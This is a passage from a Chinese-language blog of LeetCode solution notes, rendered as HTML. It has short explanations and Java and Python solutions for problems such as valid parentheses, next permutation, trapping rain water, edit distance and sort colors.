class="keyword">while</span>(f.next!=<span class="keyword">null</span>)&#123;<span class="comment">//快慢指针一起移动</span></span><br><span class="line">            tmp=tmp.next;</span><br><span class="line">            f=f.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tmp.next!=<span class="keyword">null</span>)</span><br><span class="line">            tmp.next=tmp.next.next;</span><br><span class="line">        <span class="keyword">return</span> res.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20.有效的括号"></a>20.有效的括号</h1><p><a href="https://leetcode-cn.com/problems/valid-parentheses/" target="_blank" rel="noopener">20. 有效的括号</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span><span class="params">(self, s: str)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">"&#123;&#125;"</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">"()"</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">"[]"</span> <span class="keyword">in</span> s:</span><br><span class="line">            s=s.replace(<span class="string">"&#123;&#125;"</span>,<span class="string">""</span>)</span><br><span class="line">            s=s.replace(<span class="string">"[]"</span>,<span class="string">""</span>)</span><br><span class="line">            s=s.replace(<span class="string">"()"</span>,<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">return</span> s==<span class="string">""</span></span><br></pre></td></tr></table></figure>

<h1 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title="31.下一个排列"></a>31.下一个排列</h1><p><a href="https://leetcode-cn.com/problems/next-permutation/solution/xia-yi-ge-pai-lie-suan-fa-xiang-jie-si-lu-tui-dao-/" target="_blank" rel="noopener">下一个排列</a></p>
<p>对于这种题：大于此数的下一个数（情况1）、小于此数的上一个数（情况2） 都可以用统一的套路求解</p>
<p><img src="/2020/10/21/2020-10-21-leetcode-p1/image-20200930153614180.png" alt="image-20200930153614180"></p>
<p>取第一种情况讨论：</p>
<ul>
<li>目标是，找到一个逆序对，<code>A[i] &lt; A[j]</code> ，交换其，然后将 <code>A[i:]</code>  做一个升序排列<ul>
<li><code>A[j]</code> 必须尽可能的靠后</li>
<li>先从后往前找到一个相邻的逆序对，<code>A[i]&lt; A[j]</code> ，其中跳过的 <code>A[j:]</code> 肯定是降序排列</li>
<li>然后从后往前找到第一个大于 <code>A[i]</code> 的 <code>A[k]</code> ，交换 <code>A[k]、A[i]</code> </li>
<li>然后将 <code>A[i+1:]</code> 升序排列（因为我们要找的是在交换 <code>A[k]、A[i]</code>  后的最大的数）</li>
<li>如果没有找到逆序对，就直接跳到 <code>升序排列</code>  </li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length&lt;=<span class="number">1</span>) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">int</span> i=nums.length-<span class="number">2</span>,j=nums.length-<span class="number">1</span>,k=nums.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; nums[i]&gt;=nums[j])&#123; <span class="comment">//找到第一个逆序对</span></span><br><span class="line">            i--;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=<span class="number">0</span>)&#123; </span><br><span class="line">            <span class="keyword">while</span>(nums[k]&lt;=nums[i])&#123; <span class="comment">// 找到第一个大于nums[i]的数，等于是不行的，没有效果</span></span><br><span class="line">                k--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> tmp=nums[k];</span><br><span class="line">            nums[k]=nums[i];</span><br><span class="line">            nums[i]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> l=j,r=nums.length-<span class="number">1</span>;l&lt;r;l++,r--)&#123; <span class="comment">//后面都是升序的，需要调成降序排序</span></span><br><span class="line">            <span class="keyword">int</span> tmp=nums[l];</span><br><span class="line">            nums[l]=nums[r];</span><br><span class="line">            nums[r]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="32-最长有效括号"><a href="#32-最长有效括号" class="headerlink" title="32.最长有效括号"></a>32.最长有效括号</h1><p><a href="https://leetcode-cn.com/problems/longest-valid-parentheses/submissions/" target="_blank" rel="noopener">最长有效括号</a></p>
<ul>
<li><p>当<code>【i】</code>是 <code>右括号</code> 时</p>
<ul>
<li><p>先判断它左边是不是 <code>左括号</code> ，是的话 <code>dp[i]+2</code></p>
</li>
<li><p>上面的情况不对的话，判断它左边的 <code>dp[i-1]</code> 是否大于零（代表左边有有效括号组），并且跳过这个dp[i-1]的长度之后，能找到一个 <code>左括号</code>  与其匹配，dp[i]=d[i-1]+2</p>
</li>
<li><p>最后判断，<code>i-dp[i]&gt;0</code> 与 <code>i-dp[i]</code> 处的 dp 值是否大于零，这代表着 <code>dp[i]</code> 为代表的括号组左边还有有效的括号组。</p>
<p>如果大于零（其实等于零也可以直接加哈哈哈），<code>dp[i]+=dp[i-dp[i]]</code></p>
</li>
</ul>
</li>
<li><p>左括号，直接continue</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestValidParentheses</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] sc=s.toCharArray();</span><br><span class="line">        <span class="keyword">int</span>[] dp=<span class="keyword">new</span> <span class="keyword">int</span>[sc.length];</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//System.out.println(dp[0]);</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;sc.length;i++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; sc[i]==<span class="string">')'</span>)&#123; <span class="comment">//判断是否是右括号</span></span><br><span class="line">                <span class="keyword">if</span>(sc[i-<span class="number">1</span>]==<span class="string">'('</span>)&#123;<span class="comment">//左边直接就是一个左括号？</span></span><br><span class="line">                    dp[i]=<span class="number">2</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dp[i-<span class="number">1</span>]&gt;<span class="number">0</span> &amp;&amp; i-dp[i-<span class="number">1</span>]-<span class="number">1</span>&gt;=<span class="number">0</span> &amp;&amp; sc[i-dp[i-<span class="number">1</span>]-<span class="number">1</span>]==<span class="string">'('</span>)&#123;</span><br><span class="line">                        dp[i]=dp[i-<span class="number">1</span>]+<span class="number">2</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123; <span class="comment">//其他情况直接跳过</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//这边做一个判断，判断是否可以加上之前的值</span></span><br><span class="line">                <span class="keyword">if</span>(i-dp[i]&gt;=<span class="number">1</span> &amp;&amp; dp[i-dp[i]]&gt;<span class="number">0</span>) dp[i]+=dp[i-dp[i]];</span><br><span class="line">                max=Math.max(max,dp[i]);</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//System.out.println(Arrays.toString(dp));</span></span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a>34. 在排序数组中查找元素的第一个和最后一个位置</h1><p><a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/" target="_blank" rel="noopener">34. 在排序数组中查找元素的第一个和最后一个位置</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchRange</span><span class="params">(self, nums: List[int], target: int)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums)==<span class="number">0</span>: <span class="keyword">return</span> [<span class="number">-1</span>,<span class="number">-1</span>]</span><br><span class="line">        left=<span class="number">-1</span></span><br><span class="line">        right=<span class="number">-1</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        j=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;j:</span><br><span class="line">            mid=(i+j)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&gt;=target: j=mid</span><br><span class="line">            <span class="keyword">else</span>: i=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i]==target: left=i</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        j=len(nums)<span class="number">-1</span></span><br><span class="line">        <span class="keyword">while</span> i&lt;j:</span><br><span class="line">            mid=(i+j)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> nums[mid]&lt;=target: i=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>: j=mid</span><br><span class="line">        <span class="keyword">if</span> i&gt;<span class="number">0</span> <span class="keyword">and</span> nums[i]!=target <span class="keyword">and</span> nums[i<span class="number">-1</span>]==target: i=i<span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i]==target: right=i </span><br><span class="line">        <span class="keyword">return</span> [left,right]</span><br></pre></td></tr></table></figure>

<h1 id="42-接雨水-单调栈经典题"><a href="#42-接雨水-单调栈经典题" class="headerlink" title="42.接雨水__单调栈经典题"></a>42.接雨水__单调栈经典题</h1><p><a href="https://leetcode-cn.com/problems/trapping-rain-water/" target="_blank" rel="noopener">42接雨水</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">trap</span><span class="params">(self, height: List[int])</span> -&gt; int:</span></span><br><span class="line">        stack=[]</span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(height)):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> height[stack[<span class="number">-1</span>]]&lt;height[i]:</span><br><span class="line">                top=stack.pop()</span><br><span class="line">                <span class="keyword">if</span> len(stack)==<span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">                l=stack[<span class="number">-1</span>]</span><br><span class="line">                r=i </span><br><span class="line">                h=min(height[l],height[r])-height[top]</span><br><span class="line">                res+=h*(r-l<span class="number">-1</span>)</span><br><span class="line">            stack.append(i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h1 id="46-全排列-回溯经典题"><a href="#46-全排列-回溯经典题" class="headerlink" title="46. 全排列__回溯经典题"></a>46. 全排列__回溯经典题</h1><p><a href="https://leetcode-cn.com/problems/permutations/" target="_blank" rel="noopener">46. 全排列</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(self, nums: List[int])</span> -&gt; List[List[int]]:</span></span><br><span class="line">        res=[]</span><br><span class="line">        d=dict()</span><br><span class="line">        tmp=[]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">backtrace</span><span class="params">(d,tmp)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> len(tmp)==len(nums):</span><br><span class="line">                res.append(tmp[:])</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                <span class="keyword">if</span> d.get(nums[i]): <span class="keyword">continue</span></span><br><span class="line">                d[nums[i]]=<span class="literal">True</span></span><br><span class="line">                tmp.append(nums[i])</span><br><span class="line">                backtrace(d,tmp)</span><br><span class="line">                d[nums[i]]=<span class="literal">False</span></span><br><span class="line">                tmp.pop()</span><br><span class="line">        backtrace(d,tmp)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h1 id="48-旋转图像"><a href="#48-旋转图像" class="headerlink" title="48.旋转图像"></a>48.旋转图像</h1><p><a href="https://leetcode-cn.com/problems/rotate-image/" target="_blank" rel="noopener">48.旋转图像</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix.length==<span class="number">0</span> || matrix.length!=matrix[<span class="number">0</span>].length)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> len=matrix.length;</span><br><span class="line">        <span class="keyword">int</span> layer=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(layer&lt;=(len&gt;&gt;<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">int</span> lalen=len-(layer&lt;&lt;<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;lalen-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> tmp=matrix[layer][layer+i];</span><br><span class="line">                matrix[layer][layer+i]=matrix[layer+lalen-i-<span class="number">1</span>][layer];</span><br><span class="line">                matrix[layer+lalen-<span class="number">1</span>-i][layer]=matrix[layer+lalen-<span class="number">1</span>][layer+lalen-<span class="number">1</span>-i];</span><br><span class="line">                matrix[layer+lalen-<span class="number">1</span>][layer+lalen-<span class="number">1</span>-i]=matrix[layer+i][layer+lalen-<span class="number">1</span>];</span><br><span class="line">                matrix[layer+i][layer+lalen-<span class="number">1</span>]=tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            layer++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="49-字母异位词分组"><a href="#49-字母异位词分组" class="headerlink" title="49. 字母异位词分组"></a>49. 字母异位词分组</h1><p><a href="https://leetcode-cn.com/problems/group-anagrams/" target="_blank" rel="noopener">49. 字母异位词分组</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">        HashMap&lt;String,ArrayList&lt;String&gt;&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(String s:strs)&#123;</span><br><span class="line">            <span class="keyword">char</span>[] ch=s.toCharArray();</span><br><span class="line">            Arrays.sort(ch);</span><br><span class="line">            String key=String.valueOf(ch);</span><br><span class="line">            <span class="keyword">if</span>(!map.containsKey(key)) map.put(key,<span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">            map.get(key).add(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList(map.values());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="53-最大子序和"><a href="#53-最大子序和" class="headerlink" title="53. 最大子序和"></a>53. 最大子序和</h1><p><a href="https://leetcode-cn.com/problems/maximum-subarray/" target="_blank" rel="noopener">53. 最大子序和</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> nums==[]: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        maxV=nums[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            nums[i]=max(nums[i<span class="number">-1</span>]+nums[i],nums[i])</span><br><span class="line">            maxV=max(maxV,nums[i])</span><br><span class="line">        <span class="keyword">return</span> maxV</span><br></pre></td></tr></table></figure>

<h1 id="55-跳跃游戏-扩展-最少跳数"><a href="#55-跳跃游戏-扩展-最少跳数" class="headerlink" title="55. 跳跃游戏_扩展:最少跳数"></a>55. 跳跃游戏_扩展:最少跳数</h1><p><a href="https://leetcode-cn.com/problems/jump-game/" target="_blank" rel="noopener">55. 跳跃游戏</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canJump</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxp=<span class="number">0</span>; <span class="comment">//维护一个最大值</span></span><br><span class="line">        <span class="keyword">int</span> nowmp=<span class="number">0</span>; <span class="comment">//上一阶段的最大值</span></span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;nums.length &amp;&amp; i&lt;=nowmp)&#123;</span><br><span class="line">            maxp=Math.max(nums[i]+i,maxp);</span><br><span class="line">            <span class="keyword">if</span>(i==nowmp) nowmp=maxp; <span class="comment">//更新当前阶段最大值</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxp&gt;=nums.length-<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="56-合并区间"><a href="#56-合并区间" class="headerlink" title="56. 合并区间"></a>56. 合并区间</h1><p><a href="https://leetcode-cn.com/problems/merge-intervals/" target="_blank" rel="noopener">56. 合并区间</a></p>
<p><a href="https://leetcode-cn.com/u/mruster/" target="_blank" rel="noopener">@Mruster</a> </p>
<p><code>Arrays.sort(intervals, (v1, v2) -&gt; v1[0] - v2[0]);</code> 假设传来两个值，<code>v1</code> 与 <code>v2</code>，那么他们的先后顺序以 <code>v1[0]</code> 比 <code>v2[0]</code> 的结果为准，即：若 <code>v1[0] &lt; v2[0]</code> 则 <code>v1 &lt; v2</code>，若 <code>=</code> 则 <code>=</code>，若 <code>&gt;</code> 则 <code>&gt;</code></p>
<p>举一反三：<code>Arrays.sort(intervals, (v1, v2) -&gt; v1[0] == v2[0] ? v2[1] - v1[1] : v1[0] - v2[0]);</code> 表示：传来两个值 <code>v1</code> 与 <code>v2</code>，若 <code>[0]</code> 相同，则按 <code>[1]</code> 降序；若不同则按 <code>[0]</code> 升序。</p>
<p>趁热打铁题目 <a href="https://leetcode-.com/problems/russian-doll-envelopes/" target="_blank" rel="noopener">354. 俄罗斯套娃的信封问题</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] merge(<span class="keyword">int</span>[][] intervals) &#123;</span><br><span class="line">        Arrays.sort(intervals,(v1,v2)-&gt;v1[<span class="number">0</span>]-v2[<span class="number">0</span>]); <span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">int</span> idx=-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span>[] interval:intervals)&#123;</span><br><span class="line">            <span class="keyword">if</span>(idx==-<span class="number">1</span>|| interval[<span class="number">0</span>]&gt;intervals[idx][<span class="number">1</span>])&#123;<span class="comment">//判断是否合并</span></span><br><span class="line">                intervals[++idx]=interval;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                intervals[idx][<span class="number">1</span>]=Math.max(intervals[idx][<span class="number">1</span>],interval[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.copyOf(intervals,idx+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="62-不同路径-二维动规easy"><a href="#62-不同路径-二维动规easy" class="headerlink" title="62. 不同路径__二维动规easy"></a><a href="https://leetcode-cn.com/problems/unique-paths/" target="_blank" rel="noopener">62. 不同路径</a>__二维动规easy</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int uniquePaths(int m, int n) &#123;</span><br><span class="line">        <span class="keyword">if</span>(m&lt;<span class="number">1</span> || n&lt;<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        int[][] res=new int[m][n];</span><br><span class="line">        <span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            res[<span class="number">0</span>][i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(int i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            res[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(int i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(int j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                res[i][j]=res[i<span class="number">-1</span>][j]+res[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="64-最小路径和-二维动规easy"><a href="#64-最小路径和-二维动规easy" class="headerlink" title="64. 最小路径和__二维动规easy"></a><a href="https://leetcode-cn.com/problems/minimum-path-sum/" target="_blank" rel="noopener">64. 最小路径和</a>__二维动规easy</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(grid.length==<span class="number">0</span> || grid[<span class="number">0</span>].length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;grid[<span class="number">0</span>].length;i++) grid[<span class="number">0</span>][i]+=grid[<span class="number">0</span>][i-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;grid.length;i++) grid[i][<span class="number">0</span>]+=grid[i-<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;grid.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;grid[<span class="number">0</span>].length;j++)&#123;</span><br><span class="line">                grid[i][j]+=Math.min(grid[i-<span class="number">1</span>][j],grid[i][j-<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> grid[grid.length-<span class="number">1</span>][grid[<span class="number">0</span>].length-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="70-爬楼梯-一维动规easy"><a href="#70-爬楼梯-一维动规easy" class="headerlink" title="70. 爬楼梯__一维动规easy"></a>70. 爬楼梯__一维动规easy</h1><p><a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">70. 爬楼梯</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">climbStairs</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">2</span>: <span class="keyword">return</span> n</span><br><span class="line">        dp=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">        dp[<span class="number">1</span>]=<span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n):</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>



<h1 id="72-编辑距离-⭐"><a href="#72-编辑距离-⭐" class="headerlink" title="72. 编辑距离__⭐"></a>72. 编辑距离__⭐</h1><p><a href="https://leetcode-cn.com/problems/edit-distance/" target="_blank" rel="noopener">72. 编辑距离</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(self, word1: str, word2: str)</span> -&gt; int:</span></span><br><span class="line">        dp=[[j <span class="keyword">for</span> j <span class="keyword">in</span> range(len(word2)+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(word1)+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(word1)+<span class="number">1</span>): dp[i][<span class="number">0</span>]=i</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(word2)+<span class="number">1</span>): dp[<span class="number">0</span>][i]=i</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(word1)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,len(word2)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>]:</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    dp[i][j]=min(dp[i][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+<span class="number">1</span></span><br><span class="line">                    <span class="comment"># print(dp[i][j])</span></span><br><span class="line">        <span class="keyword">return</span> dp[len(word1)][len(word2)]</span><br></pre></td></tr></table></figure>

<h1 id="75-颜色分类-三维动规⭐"><a href="#75-颜色分类-三维动规⭐" class="headerlink" title="75. 颜色分类__三维动规⭐"></a><a href="https://leetcode-cn.com/problems/sort-colors/" target="_blank" rel="noopener">75. 颜色分类</a>__三维动规⭐</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> head = <span class="number">0</span>, tail = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= tail; i++)&#123; <span class="comment">//注意：tail后面都是交换过的数字，不用判断</span></span><br><span class="line">            <span class="keyword">if</span>(nums[i] == <span class="number">0</span>)&#123;</span><br><span class="line">                temp = nums[head];<span class="comment">//交换nums[i]与nums[head]</span></span><br><span class="line">                nums[head] = <span class="number">0</span>;</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">                head++; <span class="comment">// head指针后移一位</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[i]==<span class="number">2</span>)&#123;</span><br><span class="line">                temp = nums[tail];<span class="comment">//交换nums[i]与nums[tail]</span></span><br><span class="line">                nums[tail] = <span class="number">2</span>;</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">                tail--; <span class="comment">//tail指针前移一位</span></span><br><span class="line">                i--; <span class="comment">//这里要注意！，保证下次判断的是</span></span><br><span class="line">            &#125;</span><br><span 